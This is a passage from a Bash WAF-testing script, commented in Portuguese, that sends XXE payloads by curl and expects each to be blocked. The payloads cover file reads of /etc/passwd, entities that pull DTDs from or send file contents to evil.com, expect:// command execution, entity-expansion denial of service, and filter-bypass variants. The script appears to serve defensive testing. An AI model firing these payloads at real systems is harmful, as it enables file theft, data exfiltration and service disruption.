        --data '<!DOCTYPE foo [<!ENTITY % loop SYSTEM "http://evil.com/loop.dtd">%loop;%loop;%loop;%loop;]><foo></foo>'
    
    # Memory exhaustion
    test_curl "XXE DoS: Memory exhaust 1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/zero">]><foo>&xxe;</foo>'
    
    # Quadratic blowup
    test_curl "XXE DoS: Quadratic blowup" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY a "aaaaaaaaaa...">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>'
    
    # DTD retrieval DoS
    test_curl "XXE DoS: Slow  DTD" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY % slow SYSTEM "http://very-slow-server.com/slow.dtd">%slow;]><foo></foo>'
}

#==============================================================================
# TESTES XXE WAF BYPASS
#==============================================================================
test_xxe_waf_bypass() {
    xxe_print_subsection "XXE WAF Bypass (20 variações)"
    
    # JSON to XML
    test_curl "XXE WAF: JSON to XML" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>'
    
    # Character encoding (UTF-16)
    test_curl "XXE WAF: Encoding bypass" "block" -A "$UA" -Lk -H "Content-Type: text/xml; charset=UTF-16" "${URL}" \
        --data '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # Case variation
    test_curl "XXE WAF: Case ENTITY" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!doctype foo [<!entity xxe system "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    test_curl "XXE WAF: Case DOCTYPE" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DoCtYpE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # Whitespace variations
    test_curl "XXE WAF: Extra spaces" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<! DOCTYPE   foo   [<! ENTITY   xxe   SYSTEM   "file:///etc/passwd"  >]><foo>&xxe;</foo>'
    
    test_curl "XXE WAF: Tabs" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE	foo	[<!ENTITY	xxe	SYSTEM	"file:///etc/passwd">]><foo>&xxe;</foo>'
    
    test_curl "XXE WAF: Newlines" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data $'<!DOCTYPE\nfoo\n[<!ENTITY\nxxe\nSYSTEM\n"file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # Comment insertion
    test_curl "XXE WAF: Comment in DOCTYPE" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!--comment--><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    test_curl "XXE WAF: Comment in ENTITY" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY<!---->xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # XML version variations
    test_curl "XXE WAF: XML 1.1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # No XML declaration
    test_curl "XXE WAF: No XML decl" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # Double DOCTYPE
    test_curl "XXE WAF: Double DOCTYPE" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!DOCTYPE bar [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]><foo>&xxe;</foo>'
    
    # Namespace abuse
    test_curl "XXE WAF: Namespace" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo xmlns="http://evil.com">&xxe;</foo>'
    
    # CDATA wrapping
    test_curl "XXE WAF: CDATA wrap" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>'
    
    # Parameter entity bypass
    test_curl "XXE WAF: Param entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd "<!ENTITY xxe SYSTEM \"http://evil.com/?%file;\">">%dtd;]><foo>&xxe;</foo>'
    
    # PUBLIC entity
    test_curl "XXE WAF: PUBLIC vs SYSTEM" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "Any Text" "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    # Different protocols
    test_curl "XXE WAF: ftp:// protocol" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://127.0.0.1/test">]><foo>&xxe;</foo>'
    
    test_curl "XXE WAF: expect:// protocol" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
    
    # Encoded entities
    test_curl "XXE WAF: HTML entities" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&amp;xxe;</foo>'
    
    # Mixed techniques
    test_curl "XXE WAF: Mixed bypass" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data $'<! doctype  foo\n[\n<! entity\txxe\tsystem\t"file:///etc/passwd"\t>]><foo>&xxe;</foo>'
}

#==============================================================================
# TESTES XXE EXOTIC FILES
#==============================================================================
test_xxe_exotic() {
    xxe_print_subsection "XXE in Exotic Files (15 variações)"
    
    # SVG basic
    test_curl "XXE Exotic: SVG basic" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" "${URL}" \
        --data '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>'
    
    # SVG with xlink
    test_curl "XXE Exotic: SVG xlink" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" "${URL}" \
        --data '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="expect://ls" width="200" height="200"></image></svg>'
    
    # SVG OOB
    test_curl "XXE Exotic: SVG OOB" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" "${URL}" \
        --data '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % sp SYSTEM "http://evil.com/xxe.xml">%sp;%param1;]><svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red"></svg>'
    
    # SOAP
    test_curl "XXE Exotic: SOAP" "block" -A "$UA" -Lk -H "Content-Type: text/xml" "${URL}" \
        --data '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com/">%dtd;]><xxx/>]]></foo></soap:Body>'
    
    test_curl "XXE Exotic: SOAP envelope" "block" -A "$UA" -Lk -H "Content-Type: text/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>'
    
    # RSS Feed
    test_curl "XXE Exotic: RSS" "block" -A "$UA" -Lk -H "Content-Type: application/rss+xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>'
    
    # Atom Feed
    test_curl "XXE Exotic: Atom" "block" -A "$UA" -Lk -H "Content-Type: application/atom+xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feed xmlns="http://www.w3.org/2005/Atom"><title>&xxe;</title></feed>'
    
    # SAML
    test_curl "XXE Exotic: SAML" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:Response>'
    
    # XMPP
    test_curl "XXE Exotic: XMPP" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><message><body>&xxe;</body></message>'
    
    # WebDAV
    test_curl "XXE Exotic: WebDAV PROPFIND" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -X PROPFIND "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><propfind xmlns="DAV:"><prop>&xxe;</prop></propfind>'
    
    # XLIFF
    test_curl "XXE Exotic: XLIFF" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE xliff [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xliff version="1.2"><file><body><trans-unit><source>&xxe;</source></trans-unit></body></file></xliff>'
    
    # KML (Google Earth)
    test_curl "XXE Exotic: KML" "block" -A "$UA" -Lk -H "Content-Type: application/vnd.google-earth.kml+xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE kml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><kml xmlns="http://www.opengis.net/kml/2.2"><Document><name>&xxe;</name></Document></kml>'
    
    # GPX (GPS)
    test_curl "XXE Exotic: GPX" "block" -A "$UA" -Lk -H "Content-Type: application/gpx+xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><gpx version="1.1"><metadata><name>&xxe;</name></metadata></gpx>'
    
    # DOCX (would need file upload)
    test_curl "XXE Exotic: Office XML" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><document><body><p>&xxe;</p></body></document>'
    
    # XLSX (would need file upload)  
    test_curl "XXE Exotic: Excel XML" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://evil.com/xxe.dtd">%asd;%c;]><cdl>&rrr;</cdl>'
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes XXE
#==============================================================================
run_all_xxe_tests() {
    xxe_print_section "📄 TESTES COMPLETOS DE XXE (PayloadsAllTheThings)" "-c xxe"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/XXE Injection${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 150+ testes de XXE${NC}"
    echo ""
    
    test_xxe_basic
    test_xxe_php_wrappers
    test_xxe_xinclude
    test_xxe_ssrf
    test_xxe_blind
    test_xxe_dos
    test_xxe_waf_bypass
    test_xxe_exotic
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes XXE foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c xxe${NC}"
    exit 1
fi
